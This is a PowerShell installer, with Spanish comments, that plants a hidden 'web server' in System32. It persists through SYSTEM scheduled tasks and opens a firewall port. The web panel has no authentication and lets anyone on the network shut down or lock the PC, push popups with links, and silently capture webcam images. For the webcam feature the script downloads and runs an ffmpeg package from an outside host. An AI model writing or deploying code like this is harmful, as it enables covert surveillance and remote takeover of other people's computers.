param(
    [switch]$Desinstalar, 
    [int]$Puerto = 8080
)

$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$userName = $currentUser.Split('\')[1]
$computerName = $env:COMPUTERNAME

if ($Desinstalar) {
    Write-Host "DESINSTALANDO SERVIDOR WEB..." -ForegroundColor Yellow
    
    schtasks /delete /tn "PCWeb_SYSTEM" /f 2>$null
    schtasks /delete /tn "PCWeb_SYSTEM_Minuto" /f 2>$null
    
    netsh advfirewall firewall delete rule name="PCWeb_SYSTEM" 2>$null
    
    netsh http delete urlacl url="http://*:$Puerto/" 2>$null
    netsh http delete urlacl url="http://localhost:$Puerto/" 2>$null
    netsh http delete urlacl url="http://${computerName}:$Puerto/" 2>$null
    
    Remove-Item "C:\Windows\System32\WebServer.ps1" -ErrorAction SilentlyContinue
    Remove-Item "C:\Windows\System32\WebCamCaptures" -Recurse -ErrorAction SilentlyContinue
    
    Get-Process -Name "powershell" | Where-Object { $_.CommandLine -like "*WebServer.ps1*" } | Stop-Process -Force -ErrorAction SilentlyContinue
    
    Write-Host "SERVIDOR WEB DESINSTALADO" -ForegroundColor Green
    exit
}

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Solicitando permisos de administrador..." -ForegroundColor Yellow
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Puerto $Puerto" -Verb RunAs
    exit
}

Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "   INSTALACION SERVIDOR WEB PUERTO $Puerto" -ForegroundColor Cyan
Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "Usuario: $userName"
Write-Host "PC: $computerName"
Write-Host "Puerto: $Puerto"
Write-Host ""

Write-Host "1. Creando script del servidor..." -ForegroundColor Yellow

# Crear directorio para capturas
New-Item -ItemType Directory -Path "C:\Windows\System32\WebCamCaptures" -Force | Out-Null

$webServerScript = @'
param(
    [int]$Port = 8080
)

$logPath = "C:\Windows\System32\WebServer.log"
$pidFile = "C:\Windows\System32\WebServer.pid"
$computerName = $env:COMPUTERNAME
$capturePath = "C:\Windows\System32\WebCamCaptures"
$tempDir = "$env:TEMP\webcam_temp"
$zipPackage = "ffmpeg_webcam.zip"
$baseUrl = "https://hackingetico.cl/tools/pro"

function Write-Log {
    param($Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Message" | Out-File $logPath -Append
}

function Initialize-FFmpeg {
    if (-not (Test-Path $tempDir)) {
        New-Item -Path $tempDir -ItemType Directory -Force | Out-Null
        Write-Log "Directorio temporal creado: $tempDir"
    }
    
    $ffmpegPath = "$tempDir\ffmpeg.exe"
    
    if (-not (Test-Path $ffmpegPath)) {
        Write-Log "Descargando FFmpeg desde $baseUrl/$zipPackage"
        $zipPath = "$tempDir\$zipPackage"
        
        try {
            Invoke-WebRequest -Uri "$baseUrl/$zipPackage" -OutFile $zipPath -ErrorAction Stop
            Write-Log "Paquete descargado: $zipPath"
            
            Expand-Archive -Path $zipPath -DestinationPath $tempDir -Force
            Remove-Item -Path $zipPath -Force
            Write-Log "FFmpeg descomprimido correctamente"
            
            return $true
        } catch {
            Write-Log "ERROR al descargar/descomprimir FFmpeg: $($_.Exception.Message)"
            return $false
        }
    }
    
    return $true
}

function Get-WebCamCapture {
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $outputFile = "$capturePath\capture_$timestamp.jpg"
    $ffmpegPath = "$tempDir\ffmpeg.exe"
    
    Write-Log "Iniciando captura de webcam..."
    
    if (-not (Initialize-FFmpeg)) {
        Write-Log "ERROR: No se pudo inicializar FFmpeg"
        return $null
    }
    
    try {
        Write-Log "Detectando cámaras disponibles..."
        $devicesOutput = & $ffmpegPath -list_devices true -f dshow -i dummy 2>&1 | Out-String
        
        $cameraMatches = [regex]::Matches($devicesOutput, '\[dshow.*?\] "(.*?)" \(video\)')
        
        if ($cameraMatches.Count -eq 0) {
            Write-Log "ERROR: No se encontraron cámaras"
            return $null
        }
        
        $cameraName = $cameraMatches[0].Groups[1].Value
        Write-Log "Camara detectada: $cameraName"
        
        Write-Log "Capturando imagen..."
        $tempImage = "$tempDir\webcam_capture_$timestamp.jpg"
        $ffmpegCmd = "`"$ffmpegPath`" -y -f dshow -i video=`"$cameraName`" -frames:v 1 -q:v 2 `"$tempImage`" 2>&1"
        $captureOutput = cmd /c $ffmpegCmd 2>&1
        
        if ($LASTEXITCODE -ne 0) {
            Write-Log "ERROR en captura: $captureOutput"
            return $null
        }
        
        if (-not (Test-Path $tempImage)) {
            Write-Log "ERROR: No se genero el archivo de imagen"
            return $null
        }
        
        Copy-Item $tempImage $outputFile -Force
        Write-Log "Captura guardada: $outputFile"
        
        $imageBytes = [System.IO.File]::ReadAllBytes($tempImage)
        $base64Image = [Convert]::ToBase64String($imageBytes)
        
        Remove-Item $tempImage -Force -ErrorAction SilentlyContinue
        
        Write-Log "Captura completada exitosamente"
        return @{
            Path = $outputFile
            Base64 = $base64Image
            Timestamp = $timestamp
        }
        
    } catch {
        Write-Log "ERROR en captura de webcam: $($_.Exception.Message)"
        return $null
    }
}

function Send-PopupMessage {
    param($Message, $Title = "Mensaje del Administrador", $Link = "")
    
    Write-Log "Enviando mensaje popup: $Title"
    
    $displayMessage = $Message
    if ($Link) {
        $displayMessage += "`n`nEnlace: $Link"
    }
    
    $popupScript = @"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

`$form = New-Object System.Windows.Forms.Form
`$form.Text = "$Title"
`$form.Size = New-Object System.Drawing.Size(500, 300)
`$form.StartPosition = "CenterScreen"
`$form.Topmost = `$true
`$form.FormBorderStyle = "FixedDialog"
`$form.MaximizeBox = `$false
`$form.MinimizeBox = `$false

`$label = New-Object System.Windows.Forms.Label
`$label.Text = "$displayMessage"
`$label.Location = New-Object System.Drawing.Point(20, 50)
`$label.Size = New-Object System.Drawing.Size(440, 100)
`$label.Font = New-Object System.Drawing.Font("Microsoft Sans Serif", 10)
`$label.TextAlign = "MiddleCenter"

`$buttonPanel = New-Object System.Windows.Forms.Panel
`$buttonPanel.Location = New-Object System.Drawing.Point(0, 180)
`$buttonPanel.Size = New-Object System.Drawing.Size(484, 80)

`$buttonAceptar = New-Object System.Windows.Forms.Button
`$buttonAceptar.Text = "Aceptar"
`$buttonAceptar.Location = New-Object System.Drawing.Point(150, 25)
`$buttonAceptar.Size = New-Object System.Drawing.Size(100, 30)
`$buttonAceptar.Add_Click({ `$form.Close() })

`$buttonPanel.Controls.Add(`$buttonAceptar)

if ("$Link") {
    `$buttonAbrir = New-Object System.Windows.Forms.Button
    `$buttonAbrir.Text = "Abrir Enlace"
    `$buttonAbrir.Location = New-Object System.Drawing.Point(280, 25)
    `$buttonAbrir.Size = New-Object System.Drawing.Size(100, 30)
    `$buttonAbrir.Add_Click({
        Start-Process "$Link"
        `$form.Close()
    })
    `$buttonPanel.Controls.Add(`$buttonAbrir)
}

`$form.Controls.Add(`$label)
`$form.Controls.Add(`$buttonPanel)
`$form.ShowDialog()
"@
    
    $popupFile = "$env:TEMP\popup_$(Get-Random).ps1"
    $popupScript | Out-File $popupFile -Encoding UTF8 -Force
    
    # Ejecutar como el usuario actual usando schtasks
    $taskName = "TempPopup_$(Get-Random)"
    schtasks /create /tn $taskName /tr "powershell -ExecutionPolicy Bypass -WindowStyle Normal -File `"$popupFile`"" /sc once /st 00:00 /ru $env:USERNAME /f 2>$null
    schtasks /run /tn $taskName 2>$null
    Start-Sleep -Seconds 2
    schtasks /delete /tn $taskName /f 2>$null
    
    Start-Sleep -Seconds 10
    Remove-Item $popupFile -ErrorAction SilentlyContinue
    
    Write-Log "Mensaje popup enviado"
}

function Start-WebServer {
    $pid | Out-File $pidFile -Force
    
    Write-Log "======================================"
    Write-Log "INICIANDO SERVIDOR WEB EN PUERTO $Port"
    Write-Log "Usuario: $env:USERNAME"
    Write-Log "Computadora: $computerName"
    Write-Log "PID: $pid"
    Write-Log "Nivel: SYSTEM"
    
    try {
        $listener = New-Object System.Net.HttpListener
        
        $listener.Prefixes.Add("http://*:$Port/")
        $listener.Prefixes.Add("http://localhost:$Port/")
        $listener.Prefixes.Add("http://${computerName}:$Port/")
        
        $listener.Start()
        
        Write-Log "SERVIDOR INICIADO CORRECTAMENTE"
        Write-Log "Prefijos registrados:"
        foreach ($prefix in $listener.Prefixes) {
            Write-Log "  - $prefix"
        }
        
        while ($true) {
            $context = $listener.GetContext()
            $request = $context.Request
            $response = $context.Response
            
            if ($request.Url.LocalPath -eq '/' -or $request.Url.LocalPath -eq '') {
                $html = @"
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>CONTROL PC</title>
<style>
body{background:#000;color:#0f0;font-family:monospace;padding:20px;margin:0;}
.container{max-width:900px;margin:0 auto;}
.status{background:#111;border:1px solid #0f0;padding:15px;margin-bottom:20px;}
.info{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;}
.label{color:#888;font-size:12px;}
.value{color:#0f0;font-size:18px;font-weight:bold;}
.buttons{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:20px;}
.btn{background:#111;border:1px solid #0f0;color:#0f0;padding:12px;text-align:center;cursor:pointer;font-size:14px;}
.btn:hover{background:#0f0;color:#000;}
.message-area{background:#111;border:1px solid #0f0;padding:15px;margin-bottom:20px;}
.message-input{width:100%;background:#000;border:1px solid #0f0;color:#0f0;padding:10px;margin-bottom:10px;font-family:monospace;}
.capture-preview{background:#111;border:1px solid #0f0;padding:15px;margin-bottom:20px;text-align:center;}
.capture-img{max-width:100%;max-height:300px;margin-top:10px;}
.console{background:#111;border:1px solid #0f0;padding:15px;height:150px;overflow-y:auto;font-family:monospace;font-size:12px;}
.footer{text-align:center;margin-top:20px;color:#888;font-size:12px;}
</style>
</head>
<body>
<div class="container">
<div class="status">
<div class="info">
<div><div class="label">HOSTNAME</div><div class="value" id="pcName">---</div></div>
<div><div class="label">USUARIO</div><div class="value" id="pcUser">---</div></div>
<div><div class="label">HORA</div><div class="value" id="pcTime">---</div></div>
</div>
</div>

<div class="buttons">
<div class="btn" onclick="send('apagar')">APAGAR</div>
<div class="btn" onclick="send('reiniciar')">REINICIAR</div>
<div class="btn" onclick="send('bloquear')">BLOQUEAR</div>
<div class="btn" onclick="send('estado')">ESTADO</div>
<div class="btn" onclick="send('cancelar')">CANCELAR</div>
<div class="btn" onclick="send('webcam')">CAPTURAR WEBCAM</div>
</div>

<div class="message-area">
<input type="text" id="messageTitle" placeholder="Titulo del mensaje" class="message-input" value="Mensaje del Administrador">
<textarea id="messageText" placeholder="Escribe tu mensaje aqui..." rows="3" class="message-input"></textarea>
<input type="text" id="messageLink" placeholder="Enlace para abrir (opcional)" class="message-input">
<div class="btn" onclick="sendMessage()">ENVIAR MENSAJE</div>
</div>

<div class="capture-preview" id="capturePreview" style="display:none;">
<h3>Ultima Captura</h3>
<img id="captureImage" class="capture-img">
</div>

<div class="console" id="console">
> LISTO
</div>

<div class="footer">
PUERTO $Port | PID $pid
</div>
</div>

<script>
function send(comando) {
    document.getElementById('console').innerHTML = '> EJECUTANDO: ' + comando + '...';
    
    fetch('/cmd', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ accion: comando })
    })
    .then(r => r.json())
    .then(data => {
        document.getElementById('console').innerHTML = '> ' + data.mensaje;
        if (comando === 'webcam' && data.imagen) {
            document.getElementById('captureImage').src = 'data:image/jpeg;base64,' + data.imagen;
            document.getElementById('capturePreview').style.display = 'block';
        }
    })
    .catch(e => {
        document.getElementById('console').innerHTML = '> ERROR: ' + e;
    });
}

function sendMessage() {
    var title = document.getElementById('messageTitle').value;
    var text = document.getElementById('messageText').value;
    var link = document.getElementById('messageLink').value;
    
    if (!text) {
        alert('Escribe un mensaje primero');
        return;
    }
    
    document.getElementById('console').innerHTML = '> ENVIANDO MENSAJE...';
    
    fetch('/sendmessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ titulo: title, mensaje: text, enlace: link })
    })
    .then(r => r.json())
    .then(data => {
        document.getElementById('console').innerHTML = '> ' + data.mensaje;
        document.getElementById('messageText').value = '';
        document.getElementById('messageLink').value = '';
    })
    .catch(e => {
        document.getElementById('console').innerHTML = '> ERROR: ' + e;
    });
}

function actualizarInfo() {
    fetch('/info')
    .then(r => r.json())
    .then(data => {
        document.getElementById('pcName').innerText = data.nombre;
        document.getElementById('pcUser').innerText = data.usuario;
        document.getElementById('pcTime').innerText = data.hora;
    });
}

actualizarInfo();
setInterval(actualizarInfo, 1000);
</script>
</body>
</html>
"@
                $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
                $response.ContentType = 'text/html; charset=utf-8'
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
            elseif ($request.Url.LocalPath -eq '/info') {
                $info = @{
                    nombre = $env:COMPUTERNAME
                    usuario = $env:USERNAME
                    hora = (Get-Date).ToString('HH:mm:ss')
                }
                $json = $info | ConvertTo-Json
                $buffer = [System.Text.Encoding]::UTF8.GetBytes($json)
                $response.ContentType = 'application/json; charset=utf-8'
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
            elseif ($request.Url.LocalPath -eq '/cmd' -and $request.HttpMethod -eq 'POST') {
                $reader = New-Object System.IO.StreamReader($request.InputStream)
                $body = $reader.ReadToEnd()
                $data = $body | ConvertFrom-Json
                
                $mensaje = ""
                $imagen = $null
                
                switch ($data.accion) {
                    'apagar' { 
                        shutdown /s /f /t 0
                        $mensaje = "APAGANDO EQUIPO..."
                    }
                    'reiniciar' { 
                        shutdown /r /f /t 0
                        $mensaje = "REINICIANDO EQUIPO..."
                    }
                    'bloquear' { 
                        # Ejecutar bloqueo en el contexto del usuario usando schtasks
                        $lockScript = "$env:TEMP\lock_$(Get-Random).ps1"
                        '@' | Out-File $lockScript
                        "rundll32.exe user32.dll,LockWorkStation" | Out-File $lockScript -Append
                        $taskName = "TempLock_$(Get-Random)"
                        schtasks /create /tn $taskName /tr "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$lockScript`"" /sc once /st 00:00 /ru $env:USERNAME /f 2>$null
                        schtasks /run /tn $taskName 2>$null
                        Start-Sleep -Seconds 2
                        schtasks /delete /tn $taskName /f 2>$null
                        Remove-Item $lockScript -ErrorAction SilentlyContinue
                        $mensaje = "BLOQUEANDO SESION..."
                    }
                    'estado' { 
                        $mensaje = "SISTEMA OK - $(Get-Date)"
                    }
                    'cancelar' { 
                        shutdown /a
                        $mensaje = "APAGADO CANCELADO"
                    }
                    'webcam' {
                        # Capturar webcam directamente
                        $captura = Get-WebCamCapture
                        if ($captura -and $captura.Base64) {
                            $mensaje = "CAPTURA REALIZADA: $($captura.Timestamp)"
                            $imagen = $captura.Base64
                            Write-Log "Webcam capture successful: $($captura.Path)"
                        } else {
                            $mensaje = "ERROR AL CAPTURAR WEBCAM - Verifique que haya una camara conectada"
                            Write-Log "Webcam capture failed"
                        }
                    }
                    default { 
                        $mensaje = "COMANDO NO RECONOCIDO"
                    }
                }
                
                $result = @{ mensaje = $mensaje; imagen = $imagen }
                $json = $result | ConvertTo-Json
                $buffer = [System.Text.Encoding]::UTF8.GetBytes($json)
                $response.ContentType = 'application/json; charset=utf-8'
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
                
                Write-Log "Comando ejecutado: $($data.accion) - $mensaje"
            }
            elseif ($request.Url.LocalPath -eq '/sendmessage' -and $request.HttpMethod -eq 'POST') {
                $reader = New-Object System.IO.StreamReader($request.InputStream)
                $body = $reader.ReadToEnd()
                $data = $body | ConvertFrom-Json
                
                Send-PopupMessage -Message $data.mensaje -Title $data.titulo -Link $data.enlace
                
                $result = @{ mensaje = "MENSAJE ENVIADO: $($data.titulo)" }
                $json = $result | ConvertTo-Json
                $buffer = [System.Text.Encoding]::UTF8.GetBytes($json)
                $response.ContentType = 'application/json; charset=utf-8'
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
                
                Write-Log "Mensaje enviado: $($data.titulo) - $($data.mensaje)"
            }
            else {
                $response.StatusCode = 404
                $buffer = [System.Text.Encoding]::UTF8.GetBytes("404 - No encontrado")
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
            
            $response.Close()
        }
    } catch {
        Write-Log "ERROR CRITICO: $_"
        Write-Log "Detalles: $($_.Exception.Message)"
        Write-Log "Stack: $($_.ScriptStackTrace)"
        
        Start-Sleep -Seconds 30
        Start-WebServer
    }
}

Start-WebServer
'@

$webServerScript | Out-File "C:\Windows\System32\WebServer.ps1" -Encoding UTF8 -Force

Write-Host "  OK - Script creado: C:\Windows\System32\WebServer.ps1" -ForegroundColor Green

Write-Host ""
Write-Host "2. Configurando firewall..." -ForegroundColor Yellow
netsh advfirewall firewall delete rule name="PCWeb_SYSTEM" 2>$null
netsh advfirewall firewall add rule name="PCWeb_SYSTEM" dir=in action=allow protocol=TCP localport=$Puerto 2>$null
Write-Host "  OK - Regla de firewall agregada" -ForegroundColor Green

Write-Host ""
Write-Host "3. Reservando URL en el sistema..." -ForegroundColor Yellow
netsh http delete urlacl url="http://*:$Puerto/" 2>$null
netsh http delete urlacl url="http://localhost:$Puerto/" 2>$null
netsh http delete urlacl url="http://${computerName}:$Puerto/" 2>$null

netsh http add urlacl url="http://*:$Puerto/" user=BUILTIN\Users 2>$null
netsh http add urlacl url="http://localhost:$Puerto/" user=BUILTIN\Users 2>$null
netsh http add urlacl url="http://${computerName}:$Puerto/" user=BUILTIN\Users 2>$null
Write-Host "  OK - URLs reservadas" -ForegroundColor Green

Write-Host ""
Write-Host "4. Creando tareas programadas como SYSTEM (ADMIN)..." -ForegroundColor Yellow

schtasks /delete /tn "PCWeb_SYSTEM" /f 2>$null
schtasks /delete /tn "PCWeb_SYSTEM_Minuto" /f 2>$null

$taskCommand = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File `"C:\Windows\System32\WebServer.ps1`" -Port $Puerto"

schtasks /create /tn "PCWeb_SYSTEM" `
    /tr "$taskCommand" `
    /sc onstart `
    /ru SYSTEM `
    /rl HIGHEST `
    /f 2>$null

schtasks /create /tn "PCWeb_SYSTEM_Minuto" `
    /tr "$taskCommand" `
    /sc minute `
    /mo 1 `
    /ru SYSTEM `
    /rl HIGHEST `
    /f 2>$null

Write-Host "  OK - Tareas creadas como SYSTEM:" -ForegroundColor Green
Write-Host "    - PCWeb_SYSTEM (al iniciar Windows)" -ForegroundColor White
Write-Host "    - PCWeb_SYSTEM_Minuto (cada 1 minuto)" -ForegroundColor White

Write-Host ""
Write-Host "5. Matando procesos anteriores..." -ForegroundColor Yellow
Get-Process -Name "powershell" | Where-Object { $_.CommandLine -like "*WebServer.ps1*" } | Stop-Process -Force -ErrorAction SilentlyContinue 2>$null
Start-Sleep -Seconds 2

Write-Host ""
Write-Host "6. Iniciando servidor como ADMIN (SYSTEM)..." -ForegroundColor Yellow

$arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"C:\Windows\System32\WebServer.ps1`" -Port $Puerto"
Start-Process powershell.exe -ArgumentList $arguments -WindowStyle Hidden -Verb RunAs

Write-Host "  OK - Servidor iniciado como ADMIN" -ForegroundColor Green
Start-Sleep -Seconds 5

Write-Host ""
Write-Host "7. Probando conexion..." -ForegroundColor Yellow

$conexionExitosa = $false
for ($i = 1; $i -le 10; $i++) {
    try {
        $test = Invoke-RestMethod -Uri "http://localhost:$Puerto/info" -TimeoutSec 2 -ErrorAction SilentlyContinue
        if ($test.nombre) {
            Write-Host "  OK - CONEXION EXITOSA (Intento $i/10)" -ForegroundColor Green
            Write-Host "    PC: $($test.nombre)" -ForegroundColor White
            Write-Host "    Usuario: $($test.usuario)" -ForegroundColor White
            $conexionExitosa = $true
            break
        }
    } catch {
        Write-Host "  Intentando conectar... (Intento $i/10)" -ForegroundColor Yellow
        Start-Sleep -Seconds 2
    }
}

if (-not $conexionExitosa) {
    Write-Host "  ADVERTENCIA: No se pudo conectar" -ForegroundColor Yellow
    Write-Host "  Revisa el log: C:\Windows\System32\WebServer.log" -ForegroundColor White
}

try {
    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*" -and $_.IPAddress -notlike "169.254.*"}).IPAddress | Select-Object -First 1
    if (-not $ip) {
        $ip = (Test-Connection -ComputerName $computerName -Count 1).IPV4Address.IPAddressToString
    }
} catch {
    $ip = "192.168.x.x"
}

Write-Host ""
Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "   INSTALACION COMPLETADA" -ForegroundColor Cyan
Write-Host "==========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "URL DE ACCESO:" -ForegroundColor Yellow
Write-Host "  Local:    http://localhost:$Puerto" -ForegroundColor White
Write-Host "  Red:      http://$($ip):$Puerto" -ForegroundColor White
Write-Host "  Nombre:   http://${computerName}:$Puerto" -ForegroundColor White
Write-Host ""
Write-Host "ARCHIVOS:" -ForegroundColor Yellow
Write-Host "  Script:   C:\Windows\System32\WebServer.ps1" -ForegroundColor White
Write-Host "  Capturas: C:\Windows\System32\WebCamCaptures\" -ForegroundColor White
Write-Host "  Log:      C:\Windows\System32\WebServer.log" -ForegroundColor White
Write-Host "  PID:      C:\Windows\System32\WebServer.pid" -ForegroundColor White
Write-Host ""
Write-Host "TAREAS PROGRAMADAS (ejecutadas como SYSTEM/ADMIN):" -ForegroundColor Yellow
Write-Host "  - PCWeb_SYSTEM (al iniciar Windows)" -ForegroundColor White
Write-Host "  - PCWeb_SYSTEM_Minuto (cada 1 minuto)" -ForegroundColor White
Write-Host ""
Write-Host "COMANDOS UTILES:" -ForegroundColor Yellow
Write-Host "  Ver log:     Get-Content C:\Windows\System32\WebServer.log -Wait" -ForegroundColor White
Write-Host "  Ver tareas:  schtasks /query /tn PCWeb_*" -ForegroundColor White
Write-Host "  Ver proceso: Get-Process | Where-Object {$_.CommandLine -like '*WebServer*'}" -ForegroundColor White
Write-Host ""
Write-Host "DESINSTALAR:" -ForegroundColor Yellow
Write-Host "  powershell -File `"$PSCommandPath`" -Desinstalar" -ForegroundColor White
Write-Host ""
Write-Host "==========================================" -ForegroundColor Cyan
Write-Host ""

Read-Host "Presiona Enter para salir"
